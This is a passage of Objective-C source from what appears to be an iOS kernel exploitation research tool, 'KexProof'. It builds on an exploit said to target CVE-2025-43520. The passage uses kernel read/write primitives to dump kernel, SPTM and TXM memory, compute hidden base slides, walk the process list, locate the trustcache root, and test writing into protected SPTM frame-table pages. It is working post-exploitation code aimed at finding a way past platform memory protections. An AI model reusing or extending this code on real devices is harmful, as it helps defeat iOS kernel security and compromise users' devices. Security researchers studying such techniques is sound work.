        memcpy(comm, window + commOff, 32);
    }

    kpNote(report, [NSString stringWithFormat:@"  %s proc=%#llx pid=%u comm=\"%s\"", label, proc, pid, comm]);
}

+ (NSString *)buildReport
{
    KPLog *log = [KPLog shared];
    NSMutableString *r = [NSMutableString string];

    struct utsname u;
    uname(&u);
    NSISO8601DateFormatter *iso = [[NSISO8601DateFormatter alloc] init];

    void (^section)(NSString *) = ^(NSString *title) {
        kpNote(r, [NSString stringWithFormat:@"\n--- %@ ---", title]);
    };
    void (^kv)(NSString *, NSString *) = ^(NSString *key, NSString *val) {
        kpNote(r, [NSString stringWithFormat:@"  %-32@ %@", key, val]);
    };

    [r appendString:@"========================================\n"];
    [r appendString:@"KexProof — дамп ядра (CVE-2025-43520, ClearSword)\n"];
    [r appendFormat:@"Дата: %@\nУстройство: %s · iOS %@ · Darwin %s · %s\n",
        [iso stringFromDate:[NSDate date]], u.machine,
        [UIDevice currentDevice].systemVersion, u.release, u.version];
    [r appendString:@"========================================\n"];

    // Self-test: read the kernel header magic and cpu_ttep through the raw
    // primitive, so a broken read path is visible before anything else.
    if (kconstant(base)) {
        uint64_t magic = 0;
        kreadbuf(kconstant(base), &magic, sizeof(magic));
        kpNote(r, [NSString stringWithFormat:@"самотест чтения: u64 @ kernel base = 0x%016llx (ждём 0x0100000cfeedfacf)", magic]);
        if (ksymbol(cpu_ttep)) {
            uint64_t ttep = 0;
            kreadbuf(ksymbol(cpu_ttep), &ttep, sizeof(ttep));
            kpNote(r, [NSString stringWithFormat:@"самотест: cpu_ttep u64 = 0x%016llx (@ 0x%016llx)", ttep, ksymbol(cpu_ttep)]);
        }
        // For each target: u64 via the stock path vs the aligned-window path,
        // plus the raw stock 32-byte window for context.
        uint64_t targets[3] = {kconstant(base), 0, 0};
        if (ksymbol(cpu_ttep)) targets[1] = ksymbol(cpu_ttep);
        if (ksymbol(mach_kobj_count)) targets[2] = ksymbol(mach_kobj_count);
        for (int t = 0; t < 3; ++t) {
            if (!targets[t]) continue;
            uint64_t stockValue = 0;
            kreadbuf(targets[t], &stockValue, sizeof(stockValue));
            uint64_t alignedValue = 0;
            early_kreadbuf_aligned(targets[t], &alignedValue, sizeof(alignedValue));
            uint8_t window[32];
            memset(window, 0, sizeof(window));
            kreadbuf(targets[t], window, sizeof(window));
            NSMutableString *hex = [NSMutableString string];
            for (int i = 0; i < 32; i += 8) {
                uint64_t q = 0;
                memcpy(&q, window + i, 8);
                [hex appendFormat:@"%016llx ", (unsigned long long)q];
            }
            kpNote(r, [NSString stringWithFormat:@"@ 0x%016llx u64 stock=0x%016llx aligned=0x%016llx",
                      targets[t],
                      (unsigned long long)stockValue,
                      (unsigned long long)alignedValue]);
            kpNote(r, [NSString stringWithFormat:@"  окно (stock): %@", hex]);
        }
    }

    section(@"Константы ядра");
    kv(@"kernel base (static)", [NSString stringWithFormat:@"0x%016llx", kconstant(staticBase)]);
    kv(@"kernel base (runtime)", [NSString stringWithFormat:@"0x%016llx", kconstant(base)]);
    kv(@"kernel slide", [NSString stringWithFormat:@"0x%016llx", kconstant(slide)]);
    kv(@"kernel_el", [NSString stringWithFormat:@"%llu", kconstant(kernel_el)]);
    kv(@"pointer_mask", [NSString stringWithFormat:@"0x%016llx", kconstant(pointer_mask)]);
    kv(@"gVirtBase", [NSString stringWithFormat:@"0x%016llx", kconstant(virtBase)]);
    kv(@"gPhysBase", [NSString stringWithFormat:@"0x%016llx", kconstant(physBase)]);
    kv(@"gPhysSize", [NSString stringWithFormat:@"0x%016llx", kconstant(physSize)]);
    kv(@"cpu_ttep", [NSString stringWithFormat:@"0x%016llx", kconstant(cpuTTEP)]);
    kv(@"vm real page size", [NSString stringWithFormat:@"0x%llx", vm_real_kernel_page_size]);
    if (kconstant(sptmBase)) {
        kv(@"sptm base", [NSString stringWithFormat:@"0x%016llx", kconstant(sptmBase)]);
        kv(@"sptm slide", [NSString stringWithFormat:@"0x%016llx", kconstant(sptmSlide)]);
    }
    if (kconstant(txmBase)) {
        kv(@"txm base", [NSString stringWithFormat:@"0x%016llx", kconstant(txmBase)]);
        kv(@"txm slide", [NSString stringWithFormat:@"0x%016llx", kconstant(txmSlide)]);
    }

    section(@"Магия заголовка ядра (первые 64 байта по kernel base)");
    if (kconstant(base)) {
        uint8_t header[64];
        if (kpRead(kconstant(base), header, sizeof(header), "kernel base", r)) {
            NSMutableString *hex = [NSMutableString string];
            kpAppendHexDump(hex, kconstant(base), header, sizeof(header));
            [log append:hex];
            [r appendString:hex];
            uint64_t magic = 0;
            memcpy(&magic, header, sizeof(magic));
            kv(@"magic check", (magic == 0x0100000CFEEDFACFULL) ? @"OK (feedfacf, MH_MAGIC_64)" : @"НЕ СОВПАЛА");
        }
    }
    else {
        kpNote(r, @"  kernel base неизвестен — пропуск");
    }

    section(@"Глобальные переменные VM (адрес символа и значение)");
    struct { const char *name; uint64_t symAddr; } vmSyms[] = {
        { "gPhysBase",     ksymbol(gPhysBase) },
        { "gVirtBase",     ksymbol(gVirtBase) },
        { "cpu_ttep",      ksymbol(cpu_ttep) },
        { "vm_first_phys", ksymbol(vm_first_phys) },
        { "vm_last_phys",  ksymbol(vm_last_phys) },
        { "pv_head_table", ksymbol(pv_head_table) },
    };
    for (size_t i = 0; i < sizeof(vmSyms) / sizeof(vmSyms[0]); i++) {
        if (!vmSyms[i].symAddr) {
            kpNote(r, [NSString stringWithFormat:@"  %-32s ключ не найден — пропуск", vmSyms[i].name]);
            continue;
        }
        kpNote(r, [NSString stringWithFormat:@"  %s символ @ 0x%016llx", vmSyms[i].name, vmSyms[i].symAddr]);
        uint64_t v = 0;
        kpReadU64(vmSyms[i].name, vmSyms[i].symAddr, &v, r);
    }

    section(@"SPTMArgs (128 байт у символа, затем по указателю)");
    if (ksymbol(SPTMArgs)) {
        uint8_t buf[128];
        if (kpRead(ksymbol(SPTMArgs), buf, sizeof(buf), "SPTMArgs", r)) {
            NSMutableString *hex = [NSMutableString string];
            kpAppendHexDump(hex, ksymbol(SPTMArgs), buf, sizeof(buf));
            [log append:hex];
            [r appendString:hex];

            uint64_t args = 0;
            memcpy(&args, buf, sizeof(args));
            args = kp_untag_ptr(args);
            kv(@"SPTMArgs ptr", [NSString stringWithFormat:@"0x%016llx", args]);
            if (kpLooksLikeKernelPointer(args)) {
                kpDumpRegion(r, "SPTMArgs target", args, 128);
            }
            else {
                kpNote(r, @"  SPTMArgs target: некорректный указатель — пропуск");
            }
        }
    }
    else {
        kpNote(r, @"  SPTMArgs: ключ не найден — пропуск");
    }

    section(@"libsptm_frame_type_params (256 байт)");
    kpDumpRegion(r, "libsptm_frame_type_params", ksymbol(libsptm_frame_type_params), 256);

    section(@"libsptm_frame_table (первые 256 байт)");
    kpDumpRegion(r, "libsptm_frame_table", ksymbol(libsptm_frame_table), 256);

    section(@"n_papt_ranges_compressed (sptm-слайд)");
    if (ksymbol_sptm(n_papt_ranges_compressed)) {
        kpNote(r, [NSString stringWithFormat:@"  n_papt_ranges_compressed символ @ 0x%016llx", ksymbol_sptm(n_papt_ranges_compressed)]);
        uint8_t buf[64];
        if (kpRead(ksymbol_sptm(n_papt_ranges_compressed), buf, sizeof(buf), "n_papt_ranges_compressed", r)) {
            uint32_t n = 0;
            memcpy(&n, buf, sizeof(n));
            kv(@"n_papt_ranges_compressed", [NSString stringWithFormat:@"%u (0x%x)", n, n]);
            NSMutableString *hex = [NSMutableString string];
            kpAppendHexDump(hex, ksymbol_sptm(n_papt_ranges_compressed), buf, sizeof(buf));
            [log append:hex];
            [r appendString:hex];
        }
    }
    else {
        kpNote(r, @"  n_papt_ranges_compressed: ключ не найден (нет SPTM-слайда?) — пропуск");
    }

    section(@"libsptm_papt_ranges (128 байт) + таблица по указателю");
    if (ksymbol(libsptm_papt_ranges)) {
        uint8_t buf[128];
        if (kpRead(ksymbol(libsptm_papt_ranges), buf, sizeof(buf), "libsptm_papt_ranges", r)) {
            NSMutableString *hex = [NSMutableString string];
            kpAppendHexDump(hex, ksymbol(libsptm_papt_ranges), buf, sizeof(buf));
            [log append:hex];
            [r appendString:hex];

            uint64_t table = 0;
            memcpy(&table, buf, sizeof(table));
            table = kp_untag_ptr(table);
            kv(@"libsptm_papt_ranges ptr", [NSString stringWithFormat:@"0x%016llx", table]);
            if (kpLooksLikeKernelPointer(table)) {
                kpDumpRegion(r, "papt table", table, 128);
            }
            else {
                kpNote(r, @"  papt table: некорректный указатель — пропуск");
            }
        }
    }
    else {
        kpNote(r, @"  libsptm_papt_ranges: ключ не найден — пропуск");
    }

    section(@"papt_ranges_compressed (sptm-слайд, 128 байт)");
    kpDumpRegion(r, "papt_ranges_compressed", ksymbol_sptm(papt_ranges_compressed), 128);

    section(@"txm_trustcache_root (txm-слайд, 64 байта + по указателям)");
    if (ksymbol_txm(txm_trustcache_root)) {
        uint8_t buf[64];
        if (kpRead(ksymbol_txm(txm_trustcache_root), buf, sizeof(buf), "txm_trustcache_root", r)) {
            NSMutableString *hex = [NSMutableString string];
            kpAppendHexDump(hex, ksymbol_txm(txm_trustcache_root), buf, sizeof(buf));
            [log append:hex];
            [r appendString:hex];

            uint64_t ptr0 = 0, rootTc = 0;
            memcpy(&ptr0, buf, sizeof(ptr0));
            memcpy(&rootTc, buf + 0x20, sizeof(rootTc));
            ptr0 = kp_untag_ptr(ptr0);
            rootTc = kp_untag_ptr(rootTc);

            kv(@"*(txm_trustcache_root)", [NSString stringWithFormat:@"0x%016llx", ptr0]);
            if (kpLooksLikeKernelPointer(ptr0)) {
                kpDumpRegion(r, "txm_trustcache_root ptr", ptr0, 64);
            }
            else {
                kpNote(r, @"  *txm_trustcache_root: некорректный указатель — пропуск");
            }

            // Dopamine's trustcache.c: active root trustcache lives at +0x20
            kv(@"*(txm_trustcache_root+0x20)", [NSString stringWithFormat:@"0x%016llx", rootTc]);
            if (kpLooksLikeKernelPointer(rootTc)) {
                kpDumpRegion(r, "root trustcache", rootTc, 64);
            }
            else {
                kpNote(r, @"  *(txm_trustcache_root+0x20): некорректный указатель — пропуск");
            }
        }
    }
    else {
        kpNote(r, @"  txm_trustcache_root: ключ не найден (нет TXM-слайда?) — пропуск");
    }

    section(@"allproc (EXP-01: две соседние головы, калибровка по kernel_task)");
    {
        uint64_t head = [self resolveAllprocHeadWithLog:r];
        if (!head) {
            kpNote(r, @"  allproc недоступен — см. диагностику выше");
        }
        else {
            // Walk and print the first four procs of the fixed chain.
            uint64_t node = head, prev = 0;
            for (int i = 0; i < 4 && kpLooksLikeKernelPointer(node) && node != prev; i++) {
                kpDumpProc(r, i == 0 ? "proc[0] (kernel_task)" : "proc[next]", node, gCommOff);
                uint64_t nextRaw = 0;
                if (!kpRead(node + koffsetof(proc, list_next), &nextRaw, sizeof(nextRaw), "p_list.le_next", r)) break;
                prev = node;
                node = kp_untag_ptr(nextRaw);
            }
        }
    }

    section(@"Конец дампа");
    return r;
}

+ (NSString *)sptmWriteTestReport
{
    NSMutableString *r = [NSMutableString string];
    [r appendString:@"\n--- Эксперимент A0: безопасное доказательство kwrite ---\n"];
    if (!gPrimitives.kreadbuf || !gPrimitives.kwritebuf) {
        [r appendString:@"KRW-примитивы не живы — сначала эксплойт.\n"];
        return r;
    }
    uint64_t kobjCount = ksymbol(mach_kobj_count);
    if (!kobjCount) {
        [r appendString:@"mach_kobj_count нет в словаре оффсетов — SKIP\n"];
        return r;
    }
    kpNote(r, [NSString stringWithFormat:@"mach_kobj_count @ 0x%llx", kobjCount]);

    // Same-value rewrite + readback: harmless on a live stats counter, and it
    // proves the write path end-to-end without touching anything SPTM-owned.
    uint64_t original = 0;
    kreadbuf(kobjCount, &original, sizeof(original));
    kpNote(r, [NSString stringWithFormat:@"прочитано до записи: 0x%llx",
              (unsigned long long)original]);

    uint64_t toggled = original ^ 0x1; // flip the lowest bit only
    kwritebuf(kobjCount, &toggled, sizeof(toggled));
    uint64_t afterWrite = 0;
    kreadbuf(kobjCount, &afterWrite, sizeof(afterWrite));
    kpNote(r, [NSString stringWithFormat:@"прочитано после записи: 0x%llx (ждём 0x%llx)",
              (unsigned long long)afterWrite, (unsigned long long)toggled]);

    // Restore the original value.
    kwritebuf(kobjCount, &original, sizeof(original));
    uint64_t restored = 0;
    kreadbuf(kobjCount, &restored, sizeof(restored));

    BOOL writeWorks = (afterWrite == toggled);
    if (writeWorks) {
        [r appendString:@"\n=== A0 PASS: kwrite пишет и читается обратно ===\n"];
        [r appendString:[NSString stringWithFormat:@"восстановление: %s (0x%llx)\n",
            restored == original ? "OK" : "СЧЁТЧИК ШАГНУЛ ПОКА ПИСАЛИ — это нормально",
            (unsigned long long)restored]];
        [r appendString:@"Запись работает. (A1) frame_table — отдельная кнопка, МОЖЕТ ПАНИКОВАТЬ (уже паниковала один раз — это и есть ответ, что EL1 туда не пишет без SPTM-байпаса).\n"];
    } else {
        [r appendString:@"\n=== A0 FAIL: записи не прилипли — kwrite не работает даже на обычной глобали ===\n"];
        [r appendString:@"Тогда и frame_table не напишется. Копаем путь записи (setsockopt ICMP6_FILTER).\n"];
    }
    return r;
}

+ (NSString *)sptmFrameTableWriteTestReport
{
    NSMutableString *r = [NSMutableString string];
    [r appendString:@"\n--- Эксперимент A1: запись в страницу SPTM frame_table (МОЖЕТ ПАНИКОВАТЬ!) ---\n"];
    if (!gPrimitives.kreadbuf || !gPrimitives.kwritebuf) {
        [r appendString:@"KRW-примитивы не живы — сначала эксплойт.\n"];
        return r;
    }
    uint64_t table = ksymbol(libsptm_frame_table);
    if (!table) {
        [r appendString:@"libsptm_frame_table нет в словаре оффсетов — SKIP\n"];
        return r;
    }
    kpNote(r, [NSString stringWithFormat:@"frame_table @ 0x%llx", table]);

    // Scan the page for a zero qword (free entry); never touch live entries.
    const size_t pageSize = 0x4000;
    uint64_t zeroSlot = 0;
    for (uint64_t off = 0; off < pageSize; off += 0x100) {
        uint8_t chunk[0x100];
        memset(chunk, 0, sizeof(chunk));
        kreadbuf(table + off, chunk, sizeof(chunk));
        for (size_t i = 0; i + 8 <= sizeof(chunk); i += 8) {
            uint64_t value = 0;
            memcpy(&value, chunk + i, sizeof(value));
            if (value == 0) {
                zeroSlot = table + off + i;
                break;
            }
        }
        if (zeroSlot) break;
    }
    if (!zeroSlot) {
        [r appendString:@"Свободных (нулевых) записей на странице нет — SKIP (живые записи не трогаем)\n"];
        return r;
    }
    kpNote(r, [NSString stringWithFormat:@"свободный слот @ 0x%llx", zeroSlot]);

    static const uint64_t marker = 0x4b50575249544531ULL; // "KPWRITE1"
    kwritebuf(zeroSlot, &marker, sizeof(marker));
    uint64_t readback = 0;
    kreadbuf(zeroSlot, &readback, sizeof(readback));
    BOOL stuck = (readback == marker);
    kpNote(r, [NSString stringWithFormat:@"записал 0x%llx, прочитал обратно 0x%llx",
              (unsigned long long)marker, (unsigned long long)readback]);

    // Always restore zeros, whatever happened above.
    uint64_t zero = 0;
    kwritebuf(zeroSlot, &zero, sizeof(zero));
    uint64_t verify = 0;
    kreadbuf(zeroSlot, &verify, sizeof(verify));

    if (stuck) {
        [r appendString:@"\n=== PASS: страница frame_table ПИШЕТСЯ из EL1 ===\n"];
        [r appendString:@"SPTM-состояние можно менять напрямую — типы/параметры фреймов на редактирование.\n"];
        [r appendString:@"Восстановление нулей: "];
        [r appendString:verify == 0 ? @"OK\n" : [NSString stringWithFormat:@"ПРОВАЛ (осталось 0x%llx)\n", (unsigned long long)verify]];
    } else {
        [r appendString:@"\n=== FAIL: запись не прилипла — страницы SPTM из EL1 не пишутся ===\n"];
        [r appendString:@"Следующие кандидаты: (B) валидация аргументов эндпоинтов, (C) гонка nest/unnest, (D) TXM-стек 0x2a.\n"];
    }
    return r;
}

#pragma mark - EXP-02: SPTM/TXM bases (DEBG fast path + pointer-vote)

// The libsptm kernel block (static 0x7b37748) holds tagged pointers to the
// shared runtime pages. Return all pointer-looking stripped values (cached).
static NSArray<NSNumber *> *gBlockPointees = nil;
+ (NSArray<NSNumber *> *)libsptmBlockPointeesWithLog:(NSMutableString *)r
{
    if (gBlockPointees) return gBlockPointees;
    NSMutableArray<NSNumber *> *out = [NSMutableArray array];
    if (!ksymbol(libsptm_n_papt_ranges)) return out;
    uint64_t blockBase = ksymbol(libsptm_n_papt_ranges) - 8; // static 0x7b37748
    uint8_t block[0xB0];
    memset(block, 0, sizeof(block));
    if (!kpRead(blockBase, block, sizeof(block), "libsptm block", r)) return out;
    [r appendString:@"  libsptm block pointees (stripped):\n"];
    for (int i = 0; i < 0xB0 / 8; i++) {
        uint64_t raw = 0;
        memcpy(&raw, block + i * 8, 8);
        uint64_t va = kp_untag_ptr(raw);
        if (kpLooksLikeKernelPointer(va)) {
            [out addObject:@(va)];
            [r appendFormat:@"    +0x%02x → 0x%016llx\n", i * 8, (unsigned long long)va];
        }
    }
    gBlockPointees = out;
    return out;
}

// Derive SPTM/TXM runtime slides by voting: scan the shared pages for qwords
// that strip into the SPTM/TXM image ranges, and for each compute candidate
// slides against known static offsets (validator funcs / TXM stubs from the
// interface map). The slide that explains the most pointers wins.
+ (BOOL)deriveSptmTxmSlidesByVote:(NSMutableString *)r
{
    if (!kconstant(staticSptmBase)) {
        kpNote(r, @"  vote: нет staticSptmBase — пропуск");
        return NO;
    }
    // Known static offsets inside the SPTM image (interface map §6.2: frame
    // type descriptor validators/hooks) and TXM image (§7: dispatcher, branch
    // table, svc stubs, trustcache root).
    static const uint64_t sptmKnown[] = {
        0xfffffff0270b9620ULL, 0xfffffff0270b9618ULL, 0xfffffff0270b8ba0ULL,
        0xfffffff0270b8f2cULL, 0xfffffff0270b8a4cULL, 0xfffffff0270b8b30ULL,
        0xfffffff0270b87a0ULL, 0xfffffff0270b86bcULL, 0xfffffff0270b8c70ULL,
        0xfffffff0270b8578ULL, 0xfffffff0270b9628ULL, 0xfffffff0270b9604ULL,
        0xfffffff0270b89e0ULL,
    };
    static const uint64_t txmKnown[] = {
        0xfffffff017026d34ULL, 0xfffffff01702718cULL,
        0xfffffff01706005cULL, 0xfffffff017060068ULL, 0xfffffff017010590ULL,
    };
    uint64_t sptmLo = kconstant(staticSptmBase), sptmHi = sptmLo + 0xF4000;
    uint64_t txmLo = kconstant(staticTxmBase), txmHi = txmLo + 0x64000;

    NSMutableDictionary<NSNumber *, NSNumber *> *sptmVotes = [NSMutableDictionary dictionary];
    NSMutableDictionary<NSNumber *, NSNumber *> *txmVotes = [NSMutableDictionary dictionary];

    NSArray<NSNumber *> *pointees = [self libsptmBlockPointeesWithLog:r];
    for (NSNumber *pv in pointees) {
        uint64_t pageVA = pv.unsignedLongLongValue;
        // scan the page in 0x400 windows
        for (uint64_t off = 0; off < 0x4000; off += 0x400) {
            uint8_t win[0x400];
            memset(win, 0, sizeof(win));
            if (!kpRead(pageVA + off, win, sizeof(win), "vote scan", r)) break;
            for (uint32_t q = 0; q + 8 <= sizeof(win); q += 8) {
                uint64_t raw = 0;
                memcpy(&raw, win + q, 8);
                uint64_t va = kp_untag_ptr(raw);
                if (va >= sptmLo && va < sptmHi) {
                    for (size_t k = 0; k < sizeof(sptmKnown) / sizeof(sptmKnown[0]); k++) {
                        int64_t cand = (int64_t)(va - sptmKnown[k]);
                        if ((cand & 0x3fff) == 0 && llabs(cand) < 0x40000000) {
                            NSNumber *key = @(cand);
                            sptmVotes[key] = @(sptmVotes[key].intValue + 1);
                        }
                    }
                }
                if (kconstant(staticTxmBase) && va >= txmLo && va < txmHi) {
                    for (size_t k = 0; k < sizeof(txmKnown) / sizeof(txmKnown[0]); k++) {
                        int64_t cand = (int64_t)(va - txmKnown[k]);
                        if ((cand & 0x3fff) == 0 && llabs(cand) < 0x40000000) {
                            NSNumber *key = @(cand);
                            txmVotes[key] = @(txmVotes[key].intValue + 1);
                        }
                    }
                }
            }
        }
    }

    BOOL okSptm = NO, okTxm = NO;
    if (sptmVotes.count) {
        NSArray<NSNumber *> *sorted = [sptmVotes.allKeys sortedArrayUsingComparator:^NSComparisonResult(NSNumber *a, NSNumber *b) {
            return [@(sptmVotes[b].intValue) compare:@(sptmVotes[a].intValue)];
        }];
        for (NSNumber *cand in sorted) {
            if ([cand isEqual:sorted.firstObject] || sptmVotes[cand].intValue >= 2) {
                kpNote(r, [NSString stringWithFormat:@"  vote SPTM: slide=%s0x%llx голосов=%d",
                          cand.longLongValue < 0 ? "-" : "", (unsigned long long)llabs(cand.longLongValue), sptmVotes[cand].intValue]);
            }
        }
        NSNumber *best = sorted.firstObject;
        if (sptmVotes[best].intValue >= 2) {
            int64_t slide = best.longLongValue;
            gSystemInfo.kernelConstant.sptmSlide = (uint64_t)slide;
            gSystemInfo.kernelConstant.sptmBase = kconstant(staticSptmBase) + slide;
            kpNote(r, [NSString stringWithFormat:@"  EXP-02: sptmSlide=%s0x%llx (голосов=%d), sptmBase=0x%016llx",
                      slide < 0 ? "-" : "", (unsigned long long)llabs(slide), sptmVotes[best].intValue,
                      (unsigned long long)kconstant(sptmBase)]);
            okSptm = YES;
        }
    }
    if (txmVotes.count) {
        NSArray<NSNumber *> *sorted = [txmVotes.allKeys sortedArrayUsingComparator:^NSComparisonResult(NSNumber *a, NSNumber *b) {
            return [@(txmVotes[b].intValue) compare:@(txmVotes[a].intValue)];
        }];
        NSNumber *best = sorted.firstObject;
        kpNote(r, [NSString stringWithFormat:@"  vote TXM: slide=%s0x%llx голосов=%d (слабо)",
                  best.longLongValue < 0 ? "-" : "", (unsigned long long)llabs(best.longLongValue), txmVotes[best].intValue]);
        int64_t slide = best.longLongValue;
        gSystemInfo.kernelConstant.txmSlide = (uint64_t)slide;
        gSystemInfo.kernelConstant.txmBase = kconstant(staticTxmBase) + slide;
        kpNote(r, [NSString stringWithFormat:@"  EXP-02: txmSlide=%s0x%llx, txmBase=0x%016llx",
                  slide < 0 ? "-" : "", (unsigned long long)llabs(slide), (unsigned long long)kconstant(txmBase)]);
        okTxm = YES;
    }
    if (!okSptm) kpNote(r, @"  EXP-02: SPTM-слайд не вычислен (нет голосов) — sptmBase/slide остаются 0");
    if (!okTxm) kpNote(r, @"  EXP-02: TXM-слайд не вычислен (нет голосов) — txmBase/slide остаются 0");
    return okSptm || okTxm;
}

+ (BOOL)harvestSptmTxmBasesWithLog:(NSMutableString *)r
{
    if (kconstant(sptmBase) && kconstant(txmBase)) {
        return YES; // already harvested
    }
    uint64_t sym = ksymbol(SPTMArgs);
    if (!sym) {
        kpNote(r, @"  SPTMArgs: ключ не найден — harvest невозможен");
        return NO;
    }

    // Fast path: DEBG scan of the 16 SPTMArgs pointees. Field result on 18.6:
    // all point at SPTM-call stub pages (bti c), no DEBG — kept anyway.
    uint8_t argsBuf[128];
    memset(argsBuf, 0, sizeof(argsBuf));
    if (kpRead(sym, argsBuf, sizeof(argsBuf), "SPTMArgs", r)) {
        BOOL debgFound = NO;
        for (int i = 0; i < 16; i++) {
            uint64_t raw = 0;
            memcpy(&raw, argsBuf + i * 8, sizeof(raw));
            if (!raw) continue;
            uint64_t ptr = kp_untag_ptr(raw);
            if (!kpLooksLikeKernelPointer(ptr)) continue;
            uint8_t page[0x100];
            memset(page, 0, sizeof(page));
            if (!kpRead(ptr, page, sizeof(page), "SPTMArgs pointee", r)) continue;
            uint32_t magic = 0;
            memcpy(&magic, page, sizeof(magic));
            if (magic != 0x47424544) continue; // 'DEBG'
            uint64_t sptmB = 0, txmB = 0;
            memcpy(&sptmB, page + 0x10, sizeof(sptmB));
            memcpy(&txmB, page + 0x20, sizeof(txmB));
            kpNote(r, [NSString stringWithFormat:@"  EXP-02: DEBG найден: SPTMArgs[%d] → %#llx; sptm base=0x%016llx txm base=0x%016llx",
                      i, ptr, (unsigned long long)sptmB, (unsigned long long)txmB]);
            if (kpLooksLikeKernelPointer(sptmB) && kconstant(staticSptmBase)) {
                gSystemInfo.kernelConstant.sptmBase = sptmB;
                gSystemInfo.kernelConstant.sptmSlide = sptmB - kconstant(staticSptmBase);
            }
            if (kpLooksLikeKernelPointer(txmB) && kconstant(staticTxmBase)) {
                gSystemInfo.kernelConstant.txmBase = txmB;
                gSystemInfo.kernelConstant.txmSlide = txmB - kconstant(staticTxmBase);
            }
            debgFound = YES;
            break;
        }
        if (debgFound) return YES;
        kpNote(r, @"  EXP-02: DEBG не найден (16 pointees — стабы), перехожу к pointer-vote");
    }

    return [self deriveSptmTxmSlidesByVote:r];
}

#pragma mark - EXP-03: frame-table / descriptor / PAPT survey

static uint64_t gFrameTableVA = 0;
static BOOL gHeapTypeKnown = NO;
static uint8_t gHeapFrameType = 0;

+ (uint64_t)frameTableVAWithLog:(NSMutableString *)r
{
    if (gFrameTableVA) return gFrameTableVA;
    if (!ksymbol(libsptm_frame_table)) {
        kpNote(r, @"  libsptm_frame_table: ключ не найден — пропуск");
        return 0;
    }
    uint64_t raw = 0;
    if (!kpRead(ksymbol(libsptm_frame_table), &raw, sizeof(raw), "libsptm_frame_table slot", r)) return 0;
    uint64_t va = kp_untag_ptr(raw);
    kpNote(r, [NSString stringWithFormat:@"  frame table: raw=0x%016llx → VA 0x%016llx",
              (unsigned long long)raw, (unsigned long long)va]);
    if (!kpLooksLikeKernelPointer(va)) {
        kpNote(r, @"  frame table VA неправдоподобен — пропуск");
        return 0;
    }
    gFrameTableVA = va;
    return va;
}

// Frame-type byte for a physical address: fte = table + (pa>>14)*16, type at
// byte +2 (spec §6.1). -1 when unavailable / implausible. Silent variant for
// sweeps (the table page is proven EL1-readable before any sweep starts).
static int kpFrameTypeOfPALogged(uint64_t tableVA, uint64_t pa, NSMutableString *r)
{
    if (!tableVA || pa == 0 || pa >= 0x400000000ULL) return -1; // >16 GiB: not managed DRAM
    uint64_t fte = tableVA + (pa >> 14) * 16;
    uint8_t entry[16];
    memset(entry, 0, sizeof(entry));
    if (!kpRead(fte, entry, sizeof(entry), "frame-table entry", r)) return -1;
    return entry[2];
}

static int kpFrameTypeOfPAQuiet(uint64_t tableVA, uint64_t pa)
{
    if (!tableVA || pa == 0 || pa >= 0x400000000ULL) return -1;
    uint64_t fte = tableVA + (pa >> 14) * 16;
    uint8_t entry[16];
    memset(entry, 0, sizeof(entry));
    kreadbuf(fte, entry, sizeof(entry));
    return entry[2];
}

// §6.3: compressed PAPT range = 24 B {paddr_start, va_base, page_count, pad}.
static BOOL kpPaptEntryPlausible(const uint8_t *e)
{
    uint64_t paddr = 0, vabase = 0;
    uint32_t count = 0;
    memcpy(&paddr, e, 8);
    memcpy(&vabase, e + 8, 8);
    memcpy(&count, e + 16, 4);
    if (!paddr || (paddr & 0x3FFF)) return NO;       // page-aligned DRAM PA
    if (paddr >= 0x400000000ULL) return NO;
    if (count == 0 || count > 0x80000) return NO;    // sane page count
    if (vabase && !kpLooksLikeKernelPointer(vabase)) return NO;
    return YES;
}

static NSString *kpFmtSptmFn(uint64_t raw)
{
    uint64_t va = kp_untag_ptr(raw);
    if (!va) return @"-";
    if (kconstant(sptmBase) && va >= kconstant(sptmBase) && va < kconstant(sptmBase) + 0x100000) {
        return [NSString stringWithFormat:@"sptm+%#llx", (unsigned long long)(va - kconstant(sptmBase))];
    }
    return [NSString stringWithFormat:@"0x%016llx", (unsigned long long)va];
}

+ (NSString *)sptmSurveyReport
{
    NSMutableString *r = [NSMutableString string];
    [r appendString:@"\n=== EXP-01..03: обзор SPTM (read-only) ===\n"];
    if (!gPrimitives.kreadbuf) {
        [r appendString:@"KRW-примитивы не живы — сначала эксплойт.\n"];
        return r;
    }

    // ---------- EXP-01: allproc fix (multi-route) ----------
    [r appendString:@"\n--- EXP-01: allproc (кандидаты + калибровка по kernel_task) ---\n"];
    uint64_t head = [self resolveAllprocHeadWithLog:r];
    if (head) {
        uint64_t node = head, prev = 0;
        for (int i = 0; i < 4 && kpLooksLikeKernelPointer(node) && node != prev; i++) {
            kpDumpProc(r, "allproc", node, gCommOff);
            uint64_t nextRaw = 0;
            if (!kpRead(node + koffsetof(proc, list_next), &nextRaw, sizeof(nextRaw), "le_next", r)) break;
            prev = node;
            node = kp_untag_ptr(nextRaw);
        }
    }

    // ---------- EXP-02: bases via DEBG + pointer-vote ----------
    [r appendString:@"\n--- EXP-02: SPTM/TXM базы (DEBG + голосование) ---\n"];
    [self harvestSptmTxmBasesWithLog:r];
    kpNote(r, [NSString stringWithFormat:@"  итог: sptmBase=0x%016llx slide=0x%llx | txmBase=0x%016llx slide=0x%llx",
              (unsigned long long)kconstant(sptmBase), (unsigned long long)kconstant(sptmSlide),
              (unsigned long long)kconstant(txmBase), (unsigned long long)kconstant(txmSlide)]);

    // ---------- EXP-03: frame survey ----------
    [r appendString:@"\n--- EXP-03: frame table + дескрипторы + PAPT ---\n"];
    uint64_t tableVA = [self frameTableVAWithLog:r];

    uint64_t paramsVA = 0;
    if (ksymbol(libsptm_frame_type_params)) {
        uint64_t raw = 0;
        if (kpRead(ksymbol(libsptm_frame_type_params), &raw, sizeof(raw), "libsptm_frame_type_params slot", r)) {
            paramsVA = kp_untag_ptr(raw);
            kpNote(r, [NSString stringWithFormat:@"  frame_type_params: raw=0x%016llx → VA 0x%016llx",
                      (unsigned long long)raw, (unsigned long long)paramsVA]);
        }
    }

    // Descriptor table: read the direct pointee first. If it reads as code
    // stubs (few SPTM-image pointers), content-scan the libsptm block pointee
    // pages for the page with the densest SPTM-image pointers — that's the
    // real descriptor copy.
    size_t descCount = 63, descSize = 0x60;
    uint64_t descVA = 0;
    uint8_t *desc = malloc(descCount * descSize);
    memset(desc, 0, descCount * descSize);
    if (paramsVA && kpLooksLikeKernelPointer(paramsVA)) {
        if (kpRead(paramsVA, desc, descCount * descSize, "frame-type descriptors", r)) {
            descVA = paramsVA;
        }
    }
    if (descVA) {
        // stub detection: count hooks stripping into the SPTM image
        int sptmHits = 0;
        if (kconstant(staticSptmBase)) {
